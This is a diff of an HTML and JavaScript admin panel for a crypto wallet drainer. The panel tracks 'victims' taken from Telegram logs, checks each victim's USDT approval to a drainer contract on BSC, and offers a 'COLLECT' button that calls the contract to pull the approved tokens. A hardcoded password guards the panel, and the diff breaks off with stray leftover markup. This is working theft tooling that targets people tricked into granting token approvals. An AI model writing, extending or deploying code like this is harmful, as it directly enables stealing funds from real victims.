@@ -2,39 +2,126 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Crypto Project - Admin Panel</title>
+    <title>Crypto Admin Panel - Secure</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
 </head>
-<body class="bg-slate-900 text-white font-sans p-10">
-    <div class="max-w-4xl mx-auto">
-        <h1 class="text-4xl font-bold text-blue-500 mb-6 text-center">Victim Management</h1>
-        
-        <div class="bg-slate-800 p-6 rounded-xl mb-8 border border-slate-700 flex justify-between items-center">
-            <div>
-                <p class="text-sm text-gray-400">Admin Wallet (Owner):</p>
-                <p id="walletAddr" class="font-mono text-blue-300">Not Connected</p>
-            </div>
-            <button onclick="connectAdmin()" class="bg-blue-600 hover:bg-blue-700 px-6 py-2 rounded-lg font-bold">Connect Wallet</button>
-        </div>
+<body class="bg-gray-900 text-gray-100 font-sans p-6">
 
-        <div class="bg-slate-800 p-8 rounded-xl border border-slate-700 shadow-2xl">
-            <h2 class="text-xl mb-4 font-semibold">Withdraw USDT (BEP20)</h2>
-            <div class="space-y-4">
-                <div>
-                    <label class="block text-sm text-gray-400 mb-1">Victim Wallet Address (From Telegram)</label>
-                    <input id="victim_address" type="text" placeholder="0x..." class="w-full bg-slate-900 border border-slate-600 rounded-lg p-3 text-white focus:outline-none focus:border-blue-500">
+    <div id="login-box" class="fixed inset-0 bg-black flex items-center justify-center z-50">
+        <div class="bg-gray-800 p-8 rounded-2xl shadow-2xl border border-gray-700 w-96">
+            <h2 class="text-2xl font-bold mb-6 text-center text-blue-400">Admin Login</h2>
+            <input id="pass_input" type="password" placeholder="Enter Password" class="w-full p-3 mb-4 bg-gray-900 border border-gray-600 rounded-lg text-white">
+            <button onclick="checkPass()" class="w-full bg-blue-600 hover:bg-blue-700 p-3 rounded-lg font-bold">Unlock Dashboard</button>
+            <p id="error-msg" class="text-red-500 text-sm mt-2 hidden text-center">Galat Password!</p>
+        </div>
+    </div>
+
+    <div id="main-panel" class="hidden max-w-6xl mx-auto">
+        <header class="flex justify-between items-center mb-8 bg-gray-800 p-6 rounded-xl border-b-4 border-blue-500">
+            <h1 class="text-3xl font-black italic">CONTROL <span class="text-blue-500">CENTER</span></h1>
+            <button onclick="connectWallet()" id="connect-btn" class="bg-blue-600 px-6 py-2 rounded-lg font-bold">Connect Admin Wallet</button>
+        </header>
+
+        <div class="grid grid-cols-1 gap-6">
+            <div class="bg-gray-800 rounded-xl p-6 border border-gray-700 shadow-lg">
+                <h3 class="text-xl font-bold mb-4 text-blue-400">Victim Logs & Status</h3>
+                <div class="overflow-x-auto">
+                    <table class="w-full text-left border-collapse">
+                        <thead>
+                            <tr class="bg-gray-700 text-gray-300 uppercase text-xs">
+                                <th class="p-4 border-b border-gray-600">Victim Address</th>
+                                <th class="p-4 border-b border-gray-600">Network</th>
+                                <th class="p-4 border-b border-gray-600">Allowance</th>
+                                <th class="p-4 border-b border-gray-600">Action</th>
+                            </tr>
+                        </thead>
+                        <tbody id="victim-list">
+                            </tbody>
+                    </table>
                 </div>
-                <div>
-                    <label class="block text-sm text-gray-400 mb-1">Amount to Drain (USDT)</label>
-                    <input id="drain_amount" type="number" placeholder="Enter Amount" class="w-full bg-slate-900 border border-slate-600 rounded-lg p-3 text-white focus:outline-none focus:border-blue-500">
+                
+                <div class="mt-6 p-4 bg-gray-900 rounded-lg border border-gray-700">
+                    <p class="text-sm text-gray-400 mb-2">Add Victim from Telegram Log:</p>
+                    <div class="flex gap-4">
+                        <input id="new_victim" type="text" placeholder="0x..." class="flex-1 bg-gray-800 border border-gray-600 p-2 rounded text-sm">
+                        <button onclick="addVictimRow()" class="bg-green-600 px-4 py-2 rounded font-bold text-sm">Track Victim</button>
+                    </div>
                 </div>
-                <button onclick="executeWithdraw()" class="w-full bg-red-600 hover:bg-red-700 py-4 rounded-lg font-black text-xl transition-all shadow-lg uppercase">
-                    Transfer Funds Now
-                </button>
             </div>
         </div>
     </div>
+
+    <script>
+        const PASSWORD = "admin12";
+        const CONTRACT_ADDRESS = "YOUR_REMIX_CONTRACT_ADDRESS";
+        const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
+        const USDT_ABI = ["function allowance(address owner, address spender) view returns (uint256)"];
+        const DRAINER_ABI = ["function collect(address token, address victim, uint256 amount) public"];
+
+        let provider, signer, drainerContract;
+
+        // Login Logic
+        function checkPass() {
+            const input = document.getElementById('pass_input').value;
+            if(input === PASSWORD) {
+                document.getElementById('login-box').classList.add('hidden');
+                document.getElementById('main-panel').classList.remove('hidden');
+            } else {
+                document.getElementById('error-msg').classList.remove('hidden');
+            }
+        }
+
+        async function connectWallet() {
+            if(window.ethereum) {
+                provider = new ethers.providers.Web3Provider(window.ethereum);
+                await provider.send("eth_requestAccounts", []);
+                signer = provider.getSigner();
+                drainerContract = new ethers.Contract(CONTRACT_ADDRESS, DRAINER_ABI, signer);
+                document.getElementById('connect-btn').innerText = "Admin Connected";
+                document.getElementById('connect-btn').classList.replace('bg-blue-600', 'bg-green-600');
+            }
+        }
+
+        async function addVictimRow() {
+            const address = document.getElementById('new_victim').value;
+            if(!address || !address.startsWith('0x')) return alert("Sahi address dalo!");
+
+            const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, provider);
+            
+            // Check Live Allowance
+            const allowance = await usdtContract.allowance(address, CONTRACT_ADDRESS);
+            const status = allowance > 0 ? "✅ Approved" : "❌ No Approval";
+            const formattedAllowance = ethers.utils.formatUnits(allowance, 18);
+
+            const row = `
+                <tr class="border-b border-gray-700 hover:bg-gray-700 transition">
+                    <td class="p-4 font-mono text-sm">${address.substring(0,6)}...${address.substring(38)}</td>
+                    <td class="p-4 text-xs text-gray-400">BSC BEP20</td>
+                    <td class="p-4 text-sm font-bold ${allowance > 0 ? 'text-green-400' : 'text-red-400'}">${status} (${parseFloat(formattedAllowance).toFixed(2)})</td>
+                    <td class="p-4">
+                        <button onclick="drainFunds('${address}')" class="bg-red-600 px-3 py-1 rounded text-xs font-bold hover:scale-105 transition">COLLECT</button>
+                    </td>
+                </tr>
+            `;
+            document.getElementById('victim-list').innerHTML += row;
+            document.getElementById('new_victim').value = "";
+        }
+
+        async function drainFunds(victimAddr) {
+            if(!drainerContract) return alert("Wallet connect karo!");
+            try {
+                // Fetching balance logic can be added here
+                const amount = prompt("Kitna USDT nikalna hai?", "10");
+                const tx = await drainerContract.collect(USDT_ADDRESS, victimAddr, ethers.utils.parseUnits(amount, 18));
+                alert("Withdrawal Sent! Hash: " + tx.hash);
+            } catch (err) {
+                alert("Error: " + err.message);
+            }
+        }
+    </script>
+</body>
+</html>    </div>
 
     <script>
         // CONFIG - Inhe Remix se lekar yahan update karein
